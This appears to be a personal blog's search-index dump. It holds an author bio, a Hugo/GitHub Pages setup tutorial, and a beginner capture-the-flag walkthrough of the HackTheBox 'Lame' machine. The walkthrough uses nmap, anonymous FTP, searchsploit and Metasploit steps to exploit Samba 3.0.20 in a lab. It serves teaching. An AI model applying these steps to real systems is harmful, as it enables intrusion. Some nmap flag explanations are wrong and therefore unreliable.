[{"body":"","link":"https://jrhacka.github.io/","section":"","tags":null,"title":""},{"body":" Hello World! JRHacka is the cool hacker name for Jake Rice. I graduated from the University of Missouri in May of 2022 with a major in business, a minor in information technology, and certificates in cybersecurity and sales \u0026amp; customer development. I was president of my fraternity, involved in the MU cybersecurity organization CyberTigers, and part of the Cornell Leadership Program.\nBefore I began my current journey with cybersecurity, I was a business major and believed I wanted to go into sales. My first internship was a sales internship, and between my experience there and with my classes I slowly became aware it wasn’t for me. During my summer internship I began working on a data science Udemy, and after that an ethical hacker course. From there on out it was off to the races.\nEver since that moment I never doubted I had found my passion. I was extremely blessed and stumbled into a technician role with a local MSP upon my return from my internship. While gaining hands on experience there I have continued with rigorous self-education during my own time. Using the knowledge I have I want to help other beginners through various forms of media. Whether it is a video walkthrough of me completing a CTF, or a writeup on a piece of malware. My goal is to help other grow while I grow, and there is a lot of growing left to do.\nFeel free to message me via email, LinkedIn, or Twitter if you ever have any questions. Enjoy the site and best of luck(:\n","link":"https://jrhacka.github.io/about/","section":"","tags":["Bio"],"title":""},{"body":"","link":"https://jrhacka.github.io/categories/about-me/","section":"categories","tags":null,"title":"About Me"},{"body":"","link":"https://jrhacka.github.io/tags/bio/","section":"tags","tags":null,"title":"Bio"},{"body":"","link":"https://jrhacka.github.io/categories/","section":"categories","tags":null,"title":"Categories"},{"body":"","link":"https://jrhacka.github.io/series/creating-a-site/","section":"series","tags":null,"title":"Creating a Site"},{"body":"","link":"https://jrhacka.github.io/tags/hugo/","section":"tags","tags":null,"title":"Hugo"},{"body":"","link":"https://jrhacka.github.io/post/","section":"post","tags":null,"title":"Posts"},{"body":"","link":"https://jrhacka.github.io/series/","section":"series","tags":null,"title":"Series"},{"body":"","link":"https://jrhacka.github.io/tags/","section":"tags","tags":null,"title":"Tags"},{"body":"1 - Create a GitHub Repository and Clone it The site I created is a static site via GitHub and uses a Hugo theme. The first step is setting up your GitHub repository. In order to do this, create a free account on https://github.com/. Once you have an account you are going to want to set up two different repositories. We are doing this so one can house content until we push it to the main repository that will host the sites static files.\n1A) Select the plus sign in the top right corner and choose “New Repository” (It may be in a different spot, but should be easy to identify) 2 3B) Name it and describe it as whatever really. I named this one blog-site and put some basic description. 4 5C) Click create repository 6 7D) Repeat this for what will be the site repository. 8 (Note: Name this repository whatever you are going to name the site (enter name here).github.io) 9 10E) You should have 2 repositories that look similar to the below. 11 12F) Clone your blog repository (git clone xxxxx) 2 - Select and Clone your Theme Go to the Hugo site https://themes.gohugo.io/themes and select your theme. I used “Clarity”, but the process will be similar no matter which theme you choose. Once you have the theme you want, hop back over to your machine and we are going to create the appropriate site. Jump into the equivalent of the “Blog-Site” folder we cloned and run the following command to create a new hugo site.\n1hugo new site enternamehere Once that is done hop into that new folder(titled enternamehere) and find the themes directory. Jump into themes and run git clone on the Hugo repository. There is either a command to copy directly from the page or you can select download and copy the GitHub address.\n1git clone https://siteaddress.com/downloadyourtheme Note Depending on your theme it may be a slightly different process.\n3 - Explore your Theme \u0026amp; the Initial Configuration Jump into the themes folder, and then into the named folder that matches your theme (/themes/themename/). Check out the contents of that folder and you should see treasure troves of information. In my experience each theme I have toyed with has an “examplesite” folder with sample files and content to use. Somewhere in that folder find the theme.toml/config.toml. Copy that material and paste it into the config.toml in your site folder.\n1subl /home/kali/yourblogfolder/blogname/config.toml Be sure to change things appropriately, such as baseurl, and language if needed. Also, take some time here and really dig around in the \u0026quot;examplesite\u0026quot; folder. You will find key examples to use for your own content and site customizations.\n4 - \u0026quot;Sync\u0026quot; the Repository with your Machine Run the command Hugo to create the site locally. It will provide you with your local site address. If you don’t like it then delete the contents in the theme folder and go back to step 2 with your new theme. Depending on which theme you chose it may not run locally but go check the documentation and it should give you good instructions on how to get to that point! If it doesn’t that’s your sign to switch themes.\n1hugo server After you have confirmed you like your theme go back to the main directory (../Blog) and now clone your site repository (git clone entername.github.io). Enter that new directory and create something we can use to commit. I created a README.md. Once that is done run the following commands in this order.\nCommands in Order This is a notice that has a lot of various kinds of content in it.\nStage your changes 1git add . Commit your repository 1git commit -m \u0026#34;Enter Commit Text Here\u0026#34; Push the data through the branch 1git push origin main (On doing this for my second theme I did bump into some problems using my “Password” for Github. If you are having those troubles go into developer settings in the general settings in Github and generate a personal access token to use as your password.) After that is done jump back into your blog repository (In my case /home/kali/Blog-Site/jrhacka). Run the command: 1git submodule add –b main (address of the site repository) public This creates a “public” folder that will house content. When in that folder you should see your README.md you created in the beginning of step 4. Generate the static files by running 1hugo -t themename This will place the static files into the public directory. You will need to run that in order to update the actual site. After that hop into the public folder and run steps A, B, and C again. 5 - Change the Style Now this is more just general advice then an actual step by step guide. Refer to the documentation, open a separate command terminal and deploy the site locally, and bounce between the example site and your actual folder changing files. This is the best way I have found to customize the site as each theme is dramatically different in how they are set up. I would be more than happy to help you research if you bump into problems though!\n6 - Upload Content When it comes to uploading content, I recommend doing it this way. Find the example you like in the examplesite/content folder (or if not there refer to your theme documentation), copy it to the appropriate folder (such as Blog/jrhacka/content), and then replace it with your content and changes. I always copy those from the examplesite folder, place them in the matching directory path in my actual directory, and just edit the files. It’s much easier that way and saves you a lot of time and effort.\n7 - Go Live and Enjoy Lastly, navigate to the directory where everything is stored (/home/kali/Blog/xxx) and use hugo –t (theme name). Hop in the updated public folder and then run the git trio (add commit push – or steps A, B, \u0026amp; C from section 4). After that just continue to play with your site, but it should be live and rolling!

This walkthough of the Lame box is another begginner friendly entry level HTB. We'll explore a little anonymous FTP, and find out more about Samba. You can find the walkthrough video down below!\nStartup This is an entry level beginner freindley box, so the walkthrough is going to be the same. With that being said, the first step that other walkthoughs always skip over is spinning up the box and getting connected. While it is easy once you know how to do it if you don't know how you'll never be able to get started. Feel free to skip to the next section if you already know how to do this.\nHTB has 2 options when it comes to completing their boxes. You can spin up a machine via HTB, or connect your own using OpenVPN. I prefer to connect my because of the customizations and different tools I have on my Kali machine, but if you want here is where to find the HTB Attack Box.\nThe first step if you are connecting via OpenVPN is to first make sure you have OpenVPN installed on your device. Either start typing the command see if it autofills, or if using Kali run:\n1sudo apt install openvpn Once you are sure is installed in the same place where you see the attack box you can select OpenVPN. Change the server if desired and then download the file. Find the file location and run the following command:\n1openvpn insert/filepath/here After you have connected you may have to refresh the page in order for the connect box to turn green and show your HTB IP. After that the last step is to find the Jerry box and start it up. Heads Up That IP in the green box will be the IP you use for yourself during interactions with this box. Do not use your actual IP.\nIntelligence Gathering The first thing I always like to do is run NMap. Here is the NMap scan I ran and a breakdown of the flags I used.\n1nmap -sT -sV -Pn -p- -A -T3 tar.get.ip.add -oA /home/kali/HTB/WU/Lame/nmap/scans NMAP Flags -sT = TCP Connect() Scan\n-sV = OS Version\n-Pn = Scan all ports, and don't ping.

(Options 1-5 with 1 being slowest and 5 fastest)\n-oA = output namp in the three formatss to the specified file path.\nWhile that is running let's go ahead and see if we can find anything at the IP. Open up a web browser and put in the target machines IP address. We don't get any results, but we'll check a couple of the usual directories just in case. I searched around using /admin /login /user /signin /contact and got nothing, so lets dive in to those NMap results.\n1Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 22:53 EDT 2Nmap scan report for 10.10.10.3 3Host is up (0.033s latency). 4Not shown: 65530 filtered tcp ports (no-response) 5PORT STATE SERVICE VERSION 621/tcp open ftp vsftpd 2.3.4 7|_ftp-anon: Anonymous FTP login allowed (FTP code 230) 8| ftp-syst: 9| STAT: 10| FTP server status: 11| Connected to 10.10.14.9 12| Logged in as ftp 13| TYPE: ASCII 14| No session bandwidth limit 15| Session timeout in seconds is 300 16| Control connection is plain text 17| Data connections will be plain text 18| vsFTPd 2.3.4 - secure, fast, stable 19|_End of status 2022/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) 21| ssh-hostkey: 22| 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA) 23|_ 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA) 24139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 25445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) 263632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) 27Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port 28Aggressive OS guesses: DD-WRT v24-sp1 (Linux 2.4.36) (92%), OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%) 29No exact OS matches for host (test conditions non-ideal). 30Network Distance: 2 hops 31Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 32 33Host script results: 34|_smb2-time: Protocol negotiation failed (SMB2) 35| smb-security-mode: 36| account_used: \u0026lt;blank\u0026gt; 37| authentication_level: user 38| challenge_response: supported 39|_ message_signing: disabled (dangerous, but default) 40| smb-os-discovery: 41| OS: Unix (Samba 3.0.20-Debian) 42| Computer name: lame 43| NetBIOS computer name: 44| Domain name: hackthebox.gr 45| FQDN: lame.hackthebox.gr 46|_ System time: 2022-06-04T22:55:49-04:00 47|_clock-skew: mean: 2h00m06s, deviation: 2h49m45s, median: 3s 48 49TRACEROUTE (using proto 1/icmp) 50HOP RTT ADDRESS 511 32.78 ms 10.10.14.1 522 32.81 ms 10.10.10.3 53 54OS and Service detection performed.

Item one is the port 21 Anonymous FTP, and item two is the Samba ports 139 and 445. Lets start off by looking into port 21 first.\nPort 21 - Anonymous FTP In the NMap scan the first thing that should catch your eye is that port 21 FTP is allowing Anonymous FTP. Anonymous FTP essentially means we can log in wihout having a username or password. We will connect using the user name anonymous with no password.\n1ftp anonymous@tar.get.ip.add Heads Up The username being used is the one before the @ sign.\nOnce you get in there you can do some snooping, but you're not able to find anything. Just to cover your bases login using ftp as the user too. Unfourtaenly, there is nothing there either. It appears anonymous FTP was a red herring. That's okay though, because we have another open port to check!\nPort 139/445 - Samba First off what is Samba? Port 139 and 445 are SMB and used for file transfer, and back in the day it used to run on top of NetBIOS. Now days port 445 TCP can use it for file transfer. When looking for this specific version you do find that there is an exploit for it. This is the perfect time to introduce searchsploit.\n1searchsploit samba 3.0.2 When doing that we see several exploits, but the one we'll focus on is:\nSearchploit Result Samba 3.0.20 \u0026lt; 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) | unix/remote/16320.rb\nNow that we've found an exploit it's time to... exploit!\nExploiting the Vulnerablity From our searchsploit result we see we can use this exploit via Metasploit. Lets get it spun up and dive in.\n1msfconsole Once you have it started we can get it set up.\nMetasploit Setup 1- Use show options\n2-Set the rhost as the target IP (set rhost tar.get.ip.add)\n3-Set the lhost as your IP (set lhost your.HTB.ip.add)(The IP given to you via HTB (it's in the green box))\n4-Use exploit (exploit OR run)\nIt works!! Now time to dig around and find the flags. I'll leave that part for you, but feel free to message me if you need a hand!\nWalkthrough Video ","link":"https://jrhacka.github.io/post/lame/","section":"post","tags":["HTB","CTF_Walkthrough"],"title":"Lame is Cool"},{"body":"The clever titles just don't stop!
